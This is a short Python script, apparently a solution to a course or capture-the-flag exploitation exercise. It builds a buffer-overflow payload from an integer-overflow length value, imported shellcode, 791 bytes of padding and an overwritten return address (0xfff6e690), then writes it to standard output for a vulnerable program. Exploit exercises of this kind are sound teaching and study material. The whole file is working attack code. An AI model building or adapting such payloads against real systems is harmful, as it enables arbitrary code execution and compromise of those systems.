from shellcode import shellcode
import sys
sys.stdout.buffer.write(0x400000c8.to_bytes(4, 'little'))
sys.stdout.buffer.write(shellcode)
#787 bytes to fill
sys.stdout.buffer.write(b'A'*791)
sys.stdout.buffer.write(0xfff6e690.to_bytes(4, 'little'))
